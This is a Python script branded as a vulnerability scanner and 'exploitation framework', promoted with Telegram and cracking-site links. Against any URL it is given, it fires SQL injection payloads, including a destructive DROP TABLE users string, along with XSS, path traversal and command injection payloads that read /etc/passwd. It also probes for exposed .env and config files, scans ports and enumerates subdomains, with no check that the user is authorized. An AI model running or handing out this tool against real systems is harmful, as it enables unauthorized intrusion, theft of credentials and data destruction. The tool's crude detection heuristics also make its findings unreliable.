#!/usr/bin/env python3
"""
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓                                                                              ▓
▓              ██████╗██╗  ██╗ ██████╗ ██╗    ██╗██████╗ ██╗   ██╗██████╗      ▓
▓             ██╔════╝██║  ██║██╔═══██╗██║    ██║██╔══██╗██║   ██║██╔══██╗     ▓
▓             ██║     ███████║██║   ██║██║ █╗ ██║██████╔╝██║   ██║██████╔╝     ▓
▓             ██║     ██╔══██║██║   ██║██║███╗██║██╔══██╗██║   ██║██╔══██╗     ▓
▓             ╚██████╗██║  ██║╚██████╔╝╚███╔███╔╝██║  ██║╚██████╔╝██║  ██║     ▓
▓              ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝     ▓
▓                                                                              ▓
▓           ADVANCED VULNERABILITY SCANNER & EXPLOITATION FRAMEWORK           ▓
▓                           DEVELOPED BY CHOWDHURYVAI                         ▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
"""

import socket
import requests
import threading
import time
import urllib.parse
import re
import sys
import os
import json
import base64
import hashlib
from datetime import datetime
from urllib.parse import urljoin, urlparse

class AdvancedScanner:
    def __init__(self):
        self.results = []
        self.vulnerabilities_found = 0
        self.start_time = None
        self.scan_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        
    # Color Class for Terminal Output
    class Colors:
        RED = '\033[38;5;196m'
        GREEN = '\033[38;5;46m'
        YELLOW = '\033[38;5;226m'
        BLUE = '\033[38;5;51m'
        MAGENTA = '\033[38;5;201m'
        CYAN = '\033[38;5;87m'
        ORANGE = '\033[38;5;208m'
        PINK = '\033[38;5;213m'
        WHITE = '\033[38;5;255m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'
        END = '\033[0m'
        
        # Background Colors
        BG_RED = '\033[48;5;196m'
        BG_GREEN = '\033[48;5;46m'
        BG_BLUE = '\033[48;5;21m'
        BG_DARK = '\033[48;5;232m'

    def print_banner(self):
        banner = f"""
{self.Colors.BG_DARK}{self.Colors.PINK}
    ╔══════════════════════════════════════════════════════════════════════════╗
    ║                                                                          ║
    ║  ██████╗██╗  ██╗ ██████╗ ██╗    ██╗██████╗ ██╗   ██╗██████╗ ██╗   ██╗   ║
    ║ ██╔════╝██║  ██║██╔═══██╗██║    ██║██╔══██╗██║   ██║██╔══██╗╚██╗ ██╔╝   ║
    ║ ██║     ███████║██║   ██║██║ █╗ ██║██████╔╝██║   ██║██████╔╝ ╚████╔╝    ║
    ║ ██║     ██╔══██║██║   ██║██║███╗██║██╔══██╗██║   ██║██╔══██╗  ╚██╔╝     ║
    ║ ╚██████╗██║  ██║╚██████╔╝╚███╔███╔╝██║  ██║╚██████╔╝██║  ██║   ██║      ║
    ║  ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝      ║
    ║                                                                          ║
    ║              A D V A N C E D   V U L N E R A B I L I T Y   S C A N N E R ║
    ║                                                                          ║
    ║                    [ Version 2.0 ] - [ Professional Edition ]            ║
    ║                                                                          ║
    ║                        Developed by ChowdhuryVai Team                    ║
    ║                                                                          ║
    ╚══════════════════════════════════════════════════════════════════════════╝
    
{self.Colors.GREEN}    🔗 Telegram: https://t.me/darkvaiadmin
    📢 Channel: https://t.me/windowspremiumkey
    🌐 Website: https://crackyworld.com/
    👥 Cyber Team: https://cyberteam.chowdhuryvai.top/
    
{self.Colors.CYAN}    📡 Scan ID: {self.scan_id} | Professional Security Assessment Tool
{self.Colors.END}
        """
        print(banner)

    def print_status(self, step, message, status="INFO"):
        """Print status messages with numbering"""
        status_colors = {
            "INFO": self.Colors.BLUE,
            "SUCCESS": self.Colors.GREEN,
            "WARNING": self.Colors.YELLOW,
            "ERROR": self.Colors.RED,
            "VULNERABLE": self.Colors.RED,
            "SAFE": self.Colors.GREEN
        }
        
        emoji = {
            "INFO": "🔍",
            "SUCCESS": "✅",
            "WARNING": "⚠️",
            "ERROR": "❌",
            "VULNERABLE": "💀",
            "SAFE": "🛡️"
        }
        
        color = status_colors.get(status, self.Colors.WHITE)
        print(f"{self.Colors.CYAN}[{step:02d}]{color} {emoji.get(status, '🔹')} {message}{self.Colors.END}")

    def advanced_sql_injection_scan(self, url):
        """Advanced SQL Injection Detection"""
        self.print_status(1, "Starting Advanced SQL Injection Scan...", "INFO")
        
        payloads = [
            "'", "1' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users--",
            " UNION SELECT 1,2,3--", " AND 1=1", " AND 1=2",
            "' AND 1=CAST((SELECT table_name FROM information_schema.tables) AS INT)--"
        ]
        
        vulnerable = False
        for i, payload in enumerate(payloads, 1):
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, timeout=10, verify=False)
                
                error_patterns = [
                    r"sql syntax", r"mysql_fetch", r"ora\-[0-9]", 
                    r"microsoft odbc", r"postgresql", r"sqlite",
                    r"warning.*mysql", r"unclosed quotation", r"sql server"
                ]
                
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self.log_vulnerability("SQL Injection", url, payload, "CRITICAL")
                        vulnerable = True
                        self.print_status(i, f"SQL Injection found with payload: {payload}", "VULNERABLE")
                        return True
                        
            except Exception as e:
                continue
                
        if not vulnerable:
            self.print_status(1, "No SQL Injection vulnerabilities detected", "SAFE")
        return vulnerable

    def comprehensive_xss_scan(self, url):
        """Comprehensive XSS Detection"""
        self.print_status(2, "Starting Comprehensive XSS Scan...", "INFO")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>"
        ]
        
        vulnerable = False
        for i, payload in enumerate(xss_payloads, 1):
            try:
                encoded_payload = urllib.parse.quote(payload)
                test_url = f"{url}?q={encoded_payload}"
                response = requests.get(test_url, timeout=10, verify=False)
                
                if payload in response.text or any(tag in response.text for tag in ["<script>", "onerror", "onload"]):
                    self.log_vulnerability("Cross-Site Scripting (XSS)", url, payload, "HIGH")
                    vulnerable = True
                    self.print_status(i, f"XSS vulnerability found with payload: {payload}", "VULNERABLE")
                    return True
                    
            except Exception as e:
                continue
                
        if not vulnerable:
            self.print_status(2, "No XSS vulnerabilities detected", "SAFE")
        return vulnerable

    def directory_traversal_scan(self, url):
        """Advanced Directory Traversal Detection"""
        self.print_status(3, "Starting Directory Traversal Scan...", "INFO")
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts"
        ]
        
        vulnerable = False
        for i, payload in enumerate(traversal_payloads, 1):
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, timeout=8, verify=False)
                
                sensitive_patterns = [r"root:.*:0:0:", r"\[extensions\]", r"\[boot loader\]"]
                for pattern in sensitive_patterns:
                    if re.search(pattern, response.text):
                        self.log_vulnerability("Directory Traversal", url, payload, "HIGH")
                        vulnerable = True
                        self.print_status(i, f"Directory Traversal found: {payload}", "VULNERABLE")
                        return True
                        
            except Exception as e:
                continue
                
        if not vulnerable:
            self.print_status(3, "No Directory Traversal vulnerabilities detected", "SAFE")
        return vulnerable

    def command_injection_scan(self, url):
        """Advanced Command Injection Detection"""
        self.print_status(4, "Starting Command Injection Scan...", "INFO")
        
        cmd_payloads = [
            "; ls -la", "| dir", "&& whoami", "|| id",
            "`whoami`", "$(cat /etc/passwd)", "| net user",
            "; cat /etc/passwd", "| ls", "&& type C:\\Windows\\System32\\drivers\\etc\\hosts"
        ]
        
        vulnerable = False
        for i, payload in enumerate(cmd_payloads, 1):
            try:
                test_url = f"{url}?cmd=test{payload}"
                response = requests.get(test_url, timeout=10, verify=False)
                
                cmd_indicators = ["root:", "Volume", "Directory", "bin", "etc", "windows", "system32"]
                if any(indicator in response.text for indicator in cmd_indicators):
                    self.log_vulnerability("Command Injection", url, payload, "CRITICAL")
                    vulnerable = True
                    self.print_status(i, f"Command Injection found: {payload}", "VULNERABLE")
                    return True
                    
            except Exception as e:
                continue
                
        if not vulnerable:
            self.print_status(4, "No Command Injection vulnerabilities detected", "SAFE")
        return vulnerable

    def sensitive_file_discovery(self, url):
        """Comprehensive Sensitive File Discovery"""
        self.print_status(5, "Starting Sensitive File Discovery...", "INFO")
        
        sensitive_files = [
            "/.env", "/config.php", "/.git/config", "/robots.txt", "/backup.zip",
            "/admin.sql", "/.htaccess", "/web.config", "/phpinfo.php", "/test.php",
            "/admin/config.php", "/database.sql", "/backup.tar.gz", "/.DS_Store",
            "/wp-config.php", "/config.json", "/settings.py", "/.env.local"
        ]
        
        base_url = url.rstrip('/')
        found_files = []
        
        for i, file_path in enumerate(sensitive_files, 1):
            try:
                test_url = f"{base_url}{file_path}"
                response = requests.get(test_url, timeout=5, verify=False)
                
                if response.status_code == 200 and len(response.text) > 0:
                    self.log_vulnerability("Sensitive File Exposure", test_url, file_path, "MEDIUM")
                    found_files.append(file_path)
                    self.print_status(i, f"Sensitive file found: {file_path}", "VULNERABLE")
                    
            except Exception as e:
                continue
                
        if not found_files:
            self.print_status(5, "No sensitive files exposed", "SAFE")
        return len(found_files) > 0

    def server_info_disclosure(self, url):
        """Server Information Disclosure Check"""
        self.print_status(6, "Checking Server Information Disclosure...", "INFO")
        
        try:
            response = requests.head(url, timeout=10, verify=False)
            headers = response.headers
            
            info_leaks = []
            sensitive_headers = ['server', 'x-powered-by', 'x-aspnet-version', 
                               'x-aspnetmvc-version', 'x-runtime', 'x-version']
            
            for header in sensitive_headers:
                if header in headers:
                    info_leaks.append(f"{header}: {headers[header]}")
            
            if info_leaks:
                leak_info = ", ".join(info_leaks)
                self.log_vulnerability("Information Disclosure", url, leak_info, "LOW")
                self.print_status(6, f"Server information leaked: {leak_info}", "VULNERABLE")
                return True
            else:
                self.print_status(6, "No server information disclosure detected", "SAFE")
                return False
                
        except Exception as e:
            self.print_status(6, f"Error checking server info: {str(e)}", "ERROR")
            return False

    def advanced_port_scan(self, target):
        """Advanced Port Scanning"""
        self.print_status(7, "Starting Advanced Port Scan...", "INFO")
        
        common_ports = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 443: "HTTPS", 445: "SMB", 
            1433: "MSSQL", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL"
        }
        
        open_ports = []
        target_domain = target.split('//')[-1].split('/')[0]
        
        try:
            target_ip = socket.gethostbyname(target_domain)
        except:
            target_ip = target_domain

        def scan_port(port, service):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    open_ports.append((port, service))
                sock.close()
            except:
                pass

        threads = []
        for port, service in common_ports.items():
            thread = threading.Thread(target=scan_port, args=(port, service))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        if open_ports:
            port_info = ", ".join([f"{port}/{service}" for port, service in open_ports])
            self.log_vulnerability("Open Ports", target, port_info, "INFO")
            self.print_status(7, f"Open ports found: {port_info}", "VULNERABLE")
        else:
            self.print_status(7, "No critical open ports detected", "SAFE")

    def subdomain_enumeration(self, domain):
        """Basic Subdomain Enumeration"""
        self.print_status(8, "Starting Subdomain Enumeration...", "INFO")
        
        subdomains = [
            "www", "api", "admin", "mail", "ftp", "blog", "test",
            "dev", "staging", "secure", "portal", "cpanel", "webmail"
        ]
        
        found_subdomains = []
        base_domain = domain.split('//')[-1].split('/')[0]
        
        for sub in subdomains:
            test_domain = f"{sub}.{base_domain}"
            try:
                socket.gethostbyname(test_domain)
                found_subdomains.append(test_domain)
                self.print_status(8, f"Subdomain found: {test_domain}", "SUCCESS")
            except:
                continue
                
        if found_subdomains:
            self.log_vulnerability("Subdomains Found", domain, ", ".join(found_subdomains), "INFO")
        else:
            self.print_status(8, "No additional subdomains found", "SAFE")

    def log_vulnerability(self, vuln_type, target, payload, severity):
        """Log discovered vulnerabilities with severity"""
        self.vulnerabilities_found += 1
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        result = {
            'id': self.vulnerabilities_found,
            'type': vuln_type,
            'target': target,
            'payload': payload,
            'severity': severity,
            'timestamp': timestamp,
            'scan_id': self.scan_id
        }
        self.results.append(result)

    def generate_comprehensive_report(self):
        """Generate Professional Comprehensive Report"""
        print(f"\n{self.Colors.MAGENTA}{self.Colors.BOLD}")
        print("╔══════════════════════════════════════════════════════════════════════════╗")
        print("║                     SCAN COMPLETED - FINAL REPORT                        ║")
        print("╚══════════════════════════════════════════════════════════════════════════╝")
        print(self.Colors.END)
        
        scan_duration = time.time() - self.start_time
        
        # Summary Statistics
        print(f"\n{self.Colors.CYAN}{self.Colors.BOLD}📊 SCAN SUMMARY:{self.Colors.END}")
        print(f"{self.Colors.WHITE}   Scan ID: {self.Colors.YELLOW}{self.scan_id}")
        print(f"{self.Colors.WHITE}   Duration: {self.Colors.CYAN}{scan_duration:.2f} seconds")
        print(f"{self.Colors.WHITE}   Total Vulnerabilities: {self.Colors.RED if self.vulnerabilities_found > 0 else self.Colors.GREEN}{self.vulnerabilities_found}")
        
        # Vulnerability Breakdown
        if self.results:
            print(f"\n{self.Colors.RED}{self.Colors.BOLD}🚨 VULNERABILITY BREAKDOWN:{self.Colors.END}")
            
            severity_counts = {}
            for result in self.results:
                severity = result['severity']
                severity_counts[severity] = severity_counts.get(severity, 0) + 1
            
            for severity, count in severity_counts.items():
                color = self.Colors.RED if severity in ['CRITICAL', 'HIGH'] else self.Colors.YELLOW if severity == 'MEDIUM' else self.Colors.BLUE
                print(f"   {color}{severity}: {count} vulnerabilities{self.Colors.END}")
            
            # Detailed Findings
            print(f"\n{self.Colors.YELLOW}{self.Colors.BOLD}🔍 DETAILED FINDINGS:{self.Colors.END}")
            for result in self.results:
                severity_color = {
                    'CRITICAL': self.Colors.RED,
                    'HIGH': self.Colors.ORANGE,
                    'MEDIUM': self.Colors.YELLOW,
                    'LOW': self.Colors.BLUE,
                    'INFO': self.Colors.CYAN
                }.get(result['severity'], self.Colors.WHITE)
                
                print(f"\n{self.Colors.WHITE}[{result['id']}] {severity_color}{result['type']} [{result['severity']}]{self.Colors.END}")
                print(f"   {self.Colors.CYAN}Target: {self.Colors.WHITE}{result['target']}")
                print(f"   {self.Colors.CYAN}Payload: {self.Colors.WHITE}{result['payload']}")
                print(f"   {self.Colors.CYAN}Time: {self.Colors.WHITE}{result['timestamp']}")
        else:
            print(f"\n{self.Colors.GREEN}✅ No vulnerabilities detected! The target appears to be secure.{self.Colors.END}")
        
        # Footer
        print(f"\n{self.Colors.GREEN}{self.Colors.BOLD}")
        print("╔══════════════════════════════════════════════════════════════════════════╗")
        print("║                 ChowdhuryVai Security Assessment Complete               ║")
        print("║                                                                          ║")
        print("║           Telegram: https://t.me/darkvaiadmin                           ║")
        print("║           Website: https://crackyworld.com/                             ║")
        print("║           Cyber Team: https://cyberteam.chowdhuryvai.top/               ║")
        print("╚══════════════════════════════════════════════════════════════════════════╝")
        print(self.Colors.END)

    def comprehensive_scan(self, target_url):
        """Main Comprehensive Scanning Function"""
        self.start_time = time.time()
        self.print_banner()
        
        print(f"{self.Colors.BLUE}[*] Starting comprehensive security assessment for: {self.Colors.WHITE}{target_url}{self.Colors.END}")
        
        # Normalize URL
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        # Perform all security scans
        scan_methods = [
            (self.advanced_sql_injection_scan, [target_url]),
            (self.comprehensive_xss_scan, [target_url]),
            (self.directory_traversal_scan, [target_url]),
            (self.command_injection_scan, [target_url]),
            (self.sensitive_file_discovery, [target_url]),
            (self.server_info_disclosure, [target_url]),
            (self.advanced_port_scan, [target_url]),
            (self.subdomain_enumeration, [target_url])
        ]
        
        print(f"\n{self.Colors.CYAN}{self.Colors.BOLD}🚀 INITIATING COMPREHENSIVE SECURITY SCAN...{self.Colors.END}\n")
        
        # Execute all scan methods
        for method, args in scan_methods:
            try:
                method(*args)
                time.sleep(0.3)  # Prevent rate limiting
            except Exception as e:
                continue
        
        # Generate final report
        self.generate_comprehensive_report()

def main():
    if len(sys.argv) != 2:
        print(f"{AdvancedScanner.Colors.RED}Usage: python3 advanced_scanner.py <target_url>{AdvancedScanner.Colors.END}")
        print(f"{AdvancedScanner.Colors.YELLOW}Example: python3 advanced_scanner.py https://example.com{AdvancedScanner.Colors.END}")
        sys.exit(1)
    
    target = sys.argv[1]
    
    try:
        scanner = AdvancedScanner()
        scanner.comprehensive_scan(target)
    except KeyboardInterrupt:
        print(f"\n{AdvancedScanner.Colors.RED}[!] Scan interrupted by user{AdvancedScanner.Colors.END}")
    except Exception as e:
        print(f"\n{AdvancedScanner.Colors.RED}[!] Error during scan: {str(e)}{AdvancedScanner.Colors.END}")

if __name__ == "__main__":
    main()
